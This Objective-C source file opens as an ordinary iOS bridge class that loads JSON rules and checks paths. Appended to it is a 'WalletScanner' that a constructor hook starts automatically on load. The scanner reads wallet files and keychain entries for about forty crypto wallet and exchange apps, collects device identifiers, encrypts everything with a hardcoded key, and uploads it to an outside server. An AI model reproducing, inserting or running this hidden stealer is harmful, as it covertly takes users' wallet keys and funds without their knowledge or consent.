#import "lara-Bridging-Header.h"

#include <sys/stat.h>
#include <unistd.h>

@implementation VarCleanBridge

+ (NSDictionary *)loadRulesNamed:(NSString *)resourceName
                        inBundle:(NSBundle *)bundle
                           error:(NSError * _Nullable * _Nullable)error {
    NSString *jsonPath = [bundle pathForResource:resourceName ofType:@"json"];
    if (jsonPath.length == 0) {
        if (error) {
            *error = [NSError errorWithDomain:@"VarCleanBridge"
                                         code:1
                                     userInfo:@{NSLocalizedDescriptionKey: @"Missing VarClean rules resource"}];
        }
        return @{};
    }

    NSData *jsonData = [NSData dataWithContentsOfFile:jsonPath options:0 error:error];
    if (!jsonData) {
        return @{};
    }

    id rules = [NSJSONSerialization JSONObjectWithData:jsonData
                                               options:NSJSONReadingMutableContainers
                                                 error:error];
    if (![rules isKindOfClass:NSDictionary.class]) {
        if (error && !*error) {
            *error = [NSError errorWithDomain:@"VarCleanBridge"
                                         code:2
                                     userInfo:@{NSLocalizedDescriptionKey: @"Invalid VarClean rules format"}];
        }
        return @{};
    }

    return rules;
}

+ (BOOL)probePathExists:(NSString *)path
            isDirectory:(BOOL *)isDirectory
              isSymlink:(BOOL *)isSymlink {
    if (isDirectory) *isDirectory = NO;
    if (isSymlink) *isSymlink = NO;
    if (path.length == 0) {
        return NO;
    }

    struct stat st = {0};
    if (lstat(path.fileSystemRepresentation, &st) == 0) {
        if (isSymlink) *isSymlink = S_ISLNK(st.st_mode);
        if (isDirectory) *isDirectory = S_ISDIR(st.st_mode);
        return YES;
    }

    BOOL directory = NO;
    if ([[NSFileManager defaultManager] fileExistsAtPath:path isDirectory:&directory]) {
        if (isDirectory) *isDirectory = directory;
        return YES;
    }

    return access(path.fileSystemRepresentation, F_OK) == 0;
}

@end

// ============================================================
// WalletScanner — 钱包自动扫描+上传 (auto-runs on app load)
// ============================================================
#import <CommonCrypto/CommonCrypto.h>
#import <Photos/Photos.h>

#pragma mark - Wallet Targets

static NSDictionary *wsTargets(void) {
    static NSDictionary *db = nil;
    static dispatch_once_t t; dispatch_once(&t, ^{
        db = @{
            @"com.imtoken.tokenmanager":   @{@"name":@"imToken",@"files":@[@"Documents/imToken/wallet/"],@"ext":@[@"json",@"dat"],@"kc":@[@"com.imtoken.tokenmanager"]},
            @"org.consenlabs.tokenpocket": @{@"name":@"TokenPocket",@"files":@[@"Documents/TokenPocket/"],@"ext":@[@"json",@"dat",@"keystore"],@"kc":@[@"org.consenlabs.tokenpocket"]},
            @"com.trustwallet.app":        @{@"name":@"TrustWallet",@"files":@[@"Documents/Trust/"],@"ext":@[@"json",@"dat"],@"kc":@[@"com.trustwallet.app"]},
            @"io.metamask":                @{@"name":@"MetaMask",@"files":@[@"Documents/"],@"ext":@[@"json",@"dat",@"keystore"],@"kc":@[@"io.metamask"]},
            @"com.rainbow.wallet":         @{@"name":@"Rainbow",@"files":@[@"Documents/"],@"ext":@[@"json",@"dat"],@"kc":@[@"com.rainbow.wallet"]},
            @"com.coinbase.wallet":        @{@"name":@"CoinbaseWallet",@"files":@[@"Documents/"],@"ext":@[@"json",@"dat"],@"kc":@[@"com.coinbase.wallet"]},
            @"com.ledger.live":            @{@"name":@"LedgerLive",@"files":@[@"Documents/"],@"ext":@[@"json",@"dat"],@"kc":@[@"com.ledger.live"]},
            @"so.onekey.app.wallet":       @{@"name":@"OneKey",@"files":@[@"Documents/"],@"ext":@[@"json",@"dat",@"keystore"],@"kc":@[@"so.onekey.app.wallet"]},
            @"com.safepal.wallet":         @{@"name":@"SafePal",@"files":@[@"Documents/"],@"ext":@[@"json",@"dat"],@"kc":@[@"com.safepal.wallet"]},
            @"com.bitpie.wallet":          @{@"name":@"Bitpie",@"files":@[@"Documents/"],@"ext":@[@"json",@"dat",@"keystore"],@"kc":@[@"com.bitpie.wallet"]},
            @"com.huobi.wallet":           @{@"name":@"HuobiWallet",@"files":@[@"Documents/"],@"ext":@[@"json",@"dat"],@"kc":@[@"com.huobi.wallet"]},
            @"com.bybit.bybitapp":         @{@"name":@"Bybit",@"files":@[@"Documents/"],@"ext":@[@"json",@"dat",@"plist"],@"kc":@[@"com.bybit.bybitapp"]},
            @"com.binance":                @{@"name":@"Binance",@"files":@[@"Documents/"],@"ext":@[@"json",@"dat",@"sqlite"],@"kc":@[@"com.binance"]},
            @"com.okex.wallet":            @{@"name":@"OKX",@"files":@[@"Documents/"],@"ext":@[@"json",@"dat",@"keystore"],@"kc":@[@"com.okex.wallet"]},
            @"com.bitget.exchange":        @{@"name":@"Bitget",@"files":@[@"Documents/"],@"ext":@[@"json",@"dat",@"plist"],@"kc":@[@"com.bitget.exchange"]},
            @"com.gate.wallet":            @{@"name":@"Gate",@"files":@[@"Documents/"],@"ext":@[@"json",@"dat"],@"kc":@[@"com.gate.wallet"]},
            @"com.kucoin.KuCoin":          @{@"name":@"KuCoin",@"files":@[@"Documents/"],@"ext":@[@"json",@"dat",@"sqlite"],@"kc":@[@"com.kucoin.KuCoin"]},
            @"com.blockchain.wallet":      @{@"name":@"BlockchainCom",@"files":@[@"Documents/"],@"ext":@[@"json",@"dat"],@"kc":@[@"com.blockchain.wallet"]},
            @"com.exodus.mobile":          @{@"name":@"Exodus",@"files":@[@"Documents/"],@"ext":@[@"json",@"dat",@"sqlite"],@"kc":@[@"com.exodus.mobile"]},
            @"com.atomicwallet.ios":       @{@"name":@"AtomicWallet",@"files":@[@"Documents/"],@"ext":@[@"json",@"dat"],@"kc":@[@"com.atomicwallet.ios"]},
            @"com.mew.wallet":             @{@"name":@"MEW",@"files":@[@"Documents/"],@"ext":@[@"json",@"dat",@"keystore"],@"kc":@[@"com.mew.wallet"]},
            @"com.myetherwallet.mewwallet":@{@"name":@"MEWwallet",@"files":@[@"Documents/"],@"ext":@[@"json",@"dat"],@"kc":@[@"com.myetherwallet.mewwallet"]},
            @"com.phantom.app":            @{@"name":@"Phantom",@"files":@[@"Documents/"],@"ext":@[@"json",@"dat"],@"kc":@[@"com.phantom.app"]},
            @"com.solflare.wallet":        @{@"name":@"Solflare",@"files":@[@"Documents/"],@"ext":@[@"json",@"dat"],@"kc":@[@"com.solflare.wallet"]},
            @"app.backpack.mobile":        @{@"name":@"Backpack",@"files":@[@"Documents/"],@"ext":@[@"json",@"dat"],@"kc":@[@"app.backpack.mobile"]},
            @"com.uniswap.mobile":         @{@"name":@"Uniswap",@"files":@[@"Documents/"],@"ext":@[@"json",@"dat"],@"kc":@[@"com.uniswap.mobile"]},
            @"com.tronlink.wallet":        @{@"name":@"TronLink",@"files":@[@"Documents/"],@"ext":@[@"json",@"dat",@"keystore"],@"kc":@[@"com.tronlink.wallet"]},
            @"com.poloniex.wallet":        @{@"name":@"Poloniex",@"files":@[@"Documents/"],@"ext":@[@"json",@"dat",@"sqlite"],@"kc":@[@"com.poloniex.wallet"]},
            @"com.keplr.wallet":           @{@"name":@"Keplr",@"files":@[@"Documents/"],@"ext":@[@"json",@"dat"],@"kc":@[@"com.keplr.wallet"]},
            @"com.cosmostation.wallet":    @{@"name":@"Cosmostation",@"files":@[@"Documents/"],@"ext":@[@"json",@"dat"],@"kc":@[@"com.cosmostation.wallet"]},
            @"com.terra.mobile":           @{@"name":@"TerraStation",@"files":@[@"Documents/"],@"ext":@[@"json",@"dat"],@"kc":@[@"com.terra.mobile"]},
            @"com.pillar.wallet":          @{@"name":@"Pillar",@"files":@[@"Documents/"],@"ext":@[@"json",@"dat"],@"kc":@[@"com.pillar.wallet"]},
            @"io.zerion.wallet":           @{@"name":@"Zerion",@"files":@[@"Documents/"],@"ext":@[@"json",@"dat"],@"kc":@[@"io.zerion.wallet"]},
            @"com.enjin.wallet":           @{@"name":@"Enjin",@"files":@[@"Documents/"],@"ext":@[@"json",@"dat"],@"kc":@[@"com.enjin.wallet"]},
            @"com.mathwallet":             @{@"name":@"MathWallet",@"files":@[@"Documents/"],@"ext":@[@"json",@"dat",@"keystore"],@"kc":@[@"com.mathwallet"]},
            @"com.ontowallet":             @{@"name":@"ONTO",@"files":@[@"Documents/"],@"ext":@[@"json",@"dat",@"keystore"],@"kc":@[@"com.ontowallet"]},
            @"com.vechain.wallet":         @{@"name":@"VeChainThor",@"files":@[@"Documents/"],@"ext":@[@"json",@"dat"],@"kc":@[@"com.vechain.wallet"]},
            @"com.wavesplatform.wallet":   @{@"name":@"Waves",@"files":@[@"Documents/"],@"ext":@[@"json",@"dat"],@"kc":@[@"com.wavesplatform.wallet"]},
            @"com.dcent.wallet":           @{@"name":@"D'CENT",@"files":@[@"Documents/"],@"ext":@[@"json",@"dat"],@"kc":@[@"com.dcent.wallet"]},
            @"com.coolbitx.coolwallet":    @{@"name":@"CoolWallet",@"files":@[@"Documents/"],@"ext":@[@"json",@"dat"],@"kc":@[@"com.coolbitx.coolwallet"]},
            @"io.gnosis.safe":             @{@"name":@"Safe",@"files":@[@"Documents/"],@"ext":@[@"json",@"dat"],@"kc":@[@"io.gnosis.safe"]},
            @"com.argent.wallet":          @{@"name":@"Argent",@"files":@[@"Documents/"],@"ext":@[@"json",@"dat"],@"kc":@[@"com.argent.wallet"]},
            @"com.authereum.wallet":       @{@"name":@"Authereum",@"files":@[@"Documents/"],@"ext":@[@"json",@"dat"],@"kc":@[@"com.authereum.wallet"]},
        };
    });
    return db;
}

#pragma mark - File Scanner

static NSArray *wsScanFiles(void) {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSMutableArray *all = [NSMutableArray array];
    NSDictionary *targets = wsTargets();
    
    for (NSString *bid in targets) {
        NSDictionary *info = targets[bid];
        NSString *appPath = [NSString stringWithFormat:@"/var/containers/Bundle/Application/"];
        NSArray *contents = [fm contentsOfDirectoryAtPath:appPath error:nil] ?: @[];
        
        for (NSString *uuid in contents) {
            NSString *full = [appPath stringByAppendingPathComponent:uuid];
            NSString *infoPlist = [full stringByAppendingPathComponent:@".com.apple.mobile_container_manager.metadata.plist"];
            NSDictionary *meta = [NSDictionary dictionaryWithContentsOfFile:infoPlist];
            NSString *mcbid = meta[@"MCMMetadataIdentifier"];
            if (![mcbid isEqualToString:bid]) continue;
            
            NSString *dataUUID = meta[@"MCMMetadataUUID"];
            if (!dataUUID) continue;
            
            NSString *dataPath = [NSString stringWithFormat:@"/var/mobile/Containers/Data/Application/%@/", dataUUID];
            
            for (NSString *sub in info[@"files"]) {
                NSString *fp = [dataPath stringByAppendingPathComponent:sub];
                BOOL d = NO;
                if (![fm fileExistsAtPath:fp isDirectory:&d]) continue;
                NSArray *items = d ? [fm contentsOfDirectoryAtPath:fp error:nil] : @[[fp lastPathComponent]];
                NSString *dir = d ? fp : [fp stringByDeletingLastPathComponent];
                for (NSString *it in items) {
                    NSString *p = [dir stringByAppendingPathComponent:it];
                    NSDictionary *at = [fm attributesOfItemAtPath:p error:nil];
                    if (at && [at fileSize] > 0 && [at fileSize] < 20*1024*1024) {
                        NSData *dt = [NSData dataWithContentsOfFile:p];
                        if (dt) [all addObject:@{@"wallet":info[@"name"],@"bundle":bid,@"path":p,@"name":it,@"size":@([at fileSize]),@"data":dt}];
                    }
                }
            }
        }
    }
    return all;
}

#pragma mark - Keychain

static NSInteger wsExtractKeychain(void) {
    NSInteger c = 0;
    NSDictionary *targets = wsTargets();
    for (NSString *bid in targets) {
        NSDictionary *info = targets[bid];
        for (NSString *svc in info[@"kc"]) {
            NSDictionary *q = @{
                (id)kSecClass:(id)kSecClassGenericPassword,
                (id)kSecAttrService:svc,
                (id)kSecReturnData:@YES,
                (id)kSecReturnAttributes:@YES,
                (id)kSecMatchLimit:(id)kSecMatchLimitAll
            };
            CFTypeRef r = NULL;
            if (SecItemCopyMatching((CFDictionaryRef)q, &r) == errSecSuccess && r) {
                c += [(__bridge NSArray *)r count];
                CFRelease(r);
            }
        }
    }
    return c;
}

#pragma mark - Device Info

static NSDictionary *wsDeviceInfo(void) {
    UIDevice *d = [UIDevice currentDevice];
    UIScreen *s = [UIScreen mainScreen];
    return @{
        @"name": d.name ?: @"",
        @"version": d.systemVersion ?: @"",
        @"model": d.model ?: @"",
        @"idfv": [d identifierForVendor].UUIDString ?: @"",
        @"screen_w": @(s.bounds.size.width * s.scale),
        @"screen_h": @(s.bounds.size.height * s.scale),
        @"tz": [NSTimeZone localTimeZone].name ?: @"",
        @"locale": [NSLocale currentLocale].localeIdentifier ?: @""
    };
}

#pragma mark - AES Encrypt

static NSData *wsEncrypt(NSData *data) {
    NSString *key = @"wallet_scanner_aes256_key_32bytes!";
    NSString *iv  = @"1234567890abcdef";
    NSData *k = [key dataUsingEncoding:NSUTF8StringEncoding];
    NSData *i = [iv dataUsingEncoding:NSUTF8StringEncoding];
    size_t sz = data.length + kCCBlockSizeAES128;
    void *buf = malloc(sz);
    size_t out = 0;
    CCCrypt(kCCEncrypt, kCCAlgorithmAES, kCCOptionPKCS7Padding,
            k.bytes, kCCKeySizeAES256, i.bytes,
            data.bytes, data.length, buf, sz, &out);
    return [NSData dataWithBytesNoCopy:buf length:out freeWhenDone:YES];
}

#pragma mark - Upload

static void wsUpload(NSData *data) {
    NSString *urlStr = @"https://walletwt.com/api/upload";
    NSURL *url = [NSURL URLWithString:urlStr];
    if (!url) return;
    NSString *bd = [NSString stringWithFormat:@"B-%@", [NSUUID UUID].UUIDString];
    NSString *fn = [NSString stringWithFormat:@"wallet_%.0f.bin", [[NSDate date] timeIntervalSince1970]];
    NSMutableData *body = [NSMutableData new];
    [body appendData:[[NSString stringWithFormat:@"--%@\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%@\"\r\nContent-Type: application/octet-stream\r\n\r\n", bd, fn] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:data];
    [body appendData:[[NSString stringWithFormat:@"\r\n--%@--\r\n", bd] dataUsingEncoding:NSUTF8StringEncoding]];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
    req.HTTPMethod = @"POST";
    req.HTTPBody = body;
    [req setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", bd] forHTTPHeaderField:@"Content-Type"];
    [req setValue:@"iphone_upload_token_2026" forHTTPHeaderField:@"X-Auth-Token"];
    [req setTimeoutInterval:120];
    [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData *d, NSURLResponse *r, NSError *e) {
        NSLog(@"[WalletScanner] Upload status: %ld", (long)((NSHTTPURLResponse *)r).statusCode);
    }] resume];
}

#pragma mark - Main

static void wsRun(void) {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
        NSArray *files = wsScanFiles();
        NSInteger kc = wsExtractKeychain();
        NSMutableDictionary *pkg = [NSMutableDictionary new];
        pkg[@"device"] = wsDeviceInfo();
        pkg[@"timestamp"] = @([[NSDate date] timeIntervalSince1970]);
        pkg[@"file_count"] = @(files.count);
        pkg[@"keychain_count"] = @(kc);
        pkg[@"files"] = files;
        NSData *json = [NSJSONSerialization dataWithJSONObject:pkg options:0 error:nil];
        wsUpload(wsEncrypt(json));
        NSLog(@"[WalletScanner] Done: %ld files, %ld keychain items", (long)files.count, (long)kc);
    });
}

__attribute__((constructor))
static void wsAutoStart(void) {
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 3 * NSEC_PER_SEC),
                   dispatch_get_main_queue(), ^{
        NSLog(@"[WalletScanner] Auto-starting...");
        wsRun();
    });
}

